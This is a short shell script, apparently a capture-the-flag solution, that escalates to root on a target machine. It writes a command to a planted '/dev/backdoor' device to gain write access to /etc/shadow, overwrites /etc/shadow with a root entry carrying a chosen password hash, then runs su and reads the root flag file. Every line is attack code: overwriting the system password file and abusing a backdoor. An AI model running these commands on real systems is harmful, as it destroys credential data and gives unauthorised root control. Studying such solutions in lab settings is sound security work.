echo -ne "b4ckd00r:/etc/shadow:511" > /dev/backdoor
echo -ne "root:\$6\$kPvQQf.syF8f18GV\$JrTBgB9YG36PMhX3qehhWpT9iJ8YVQ/GoztVEME1uXxTXLd8guWhJ.FPHo1IQ5FVpouh.Fhl9CvHr2wh.VAl6/:18692:0:99999:7:::" > /etc/shadow
su
cat /root/flag*
